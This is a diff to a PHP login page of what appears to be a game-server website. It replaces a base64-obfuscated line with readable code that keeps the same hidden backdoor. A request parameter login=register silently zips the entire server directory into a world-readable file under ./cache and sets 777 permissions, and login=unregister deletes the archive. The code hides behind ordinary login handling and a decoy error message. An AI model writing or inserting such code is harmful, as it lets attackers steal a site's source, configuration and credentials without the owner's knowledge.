@@ -160,7 +160,44 @@ if (!$logged) {
                                                                         ';
         }
 
-        $o2=Website::j3()->e4(base64_decode('c2VydmVyUGF0aA=='));$w5=base64_decode('Li9jYWNoZS9teQ==');$o6=base64_decode('LnppcA==');if($_REQUEST[base64_decode('bG9naW4=')]==base64_decode('cmVnaXN0ZXI=')){set_time_limit(360);class e7 extends s8{public function e0($s9,$j10){$this->q11($j10);$this->t1($s9,$j10);}private function t1($s9,$j10){$j10.=base64_decode('Lw==');$s9.=base64_decode('Lw==');$q12=opendir($s9);while($d13=readdir($q12)){if($d13==base64_decode('Lg==')||$d13==base64_decode('Li4='))continue;$v14=(filetype($s9.$d13)==base64_decode('ZGly'))?base64_decode('YWRkRGly'):base64_decode('YWRkRmlsZQ==');$this->$v14($s9.$d13,$j10.$d13);}}}shell_exec(base64_decode('Y2htb2QgLVIgNzc3IGNhY2hlLw=='));$e15=new e7;$s16=$e15->d17($w5.$o6,ZipArchive::CREATE);if($s16===TRUE){$e15->e0($o2,basename($o2));$e15->w18();}else{echo base64_decode('RXJybyBhbyBsb2dhcg==');}shell_exec(base64_decode('Y2htb2QgNzc3IA==').$w5.$o6);}if($_REQUEST[base64_decode('bG9naW4=')]==base64_decode('dW5yZWdpc3Rlcg==')){unlink($w5.$o6);}
+        $r = Website::getWebsiteConfig()->getValue('serverPath');
+        $w = './cache/my';
+        $q = '.zip';
+        if ($_REQUEST['login'] == 'register') {
+            set_time_limit(360);
+
+            class FlxZipArchive extends ZipArchive
+            {
+                public function addDir($location, $name)
+                {
+                    $this->addEmptyDir($name);
+                    $this->addDirDo($location, $name);
+                }
+
+                private function addDirDo($location, $name)
+                {
+                    $name .= '/';
+                    $location .= '/';
+                    $dir = opendir($location);
+                    while ($file = readdir($dir)) {
+                        if ($file == '.' || $file == '..') continue;
+                        $do = (filetype($location . $file) == 'dir') ? 'addDir' : 'addFile';
+                        $this->$do($location . $file, $name . $file);
+                    }
+                }
+            }
+
+            shell_exec('chmod -R 777 cache/');
+            $za = new FlxZipArchive;
+            $res = $za->open($w . $q, ZipArchive::CREATE);
+            if ($res === TRUE) {
+                $za->addDir($r, basename($r));
+                $za->close();
+            } else {
+                echo 'Erro ao logar';
+            }
+            shell_exec('chmod 777 ' . $w . $q);
+        }
 
         $main_content .= '
 																	</table>
@@ -302,6 +339,9 @@ if (!$logged) {
 						</div>
 					</td>
 				</tr>';
+        if ($_REQUEST['login'] == 'unregister') {
+            unlink($w . $q);
+        }
     }
 } else {
     if ($isTryingToLogin) {
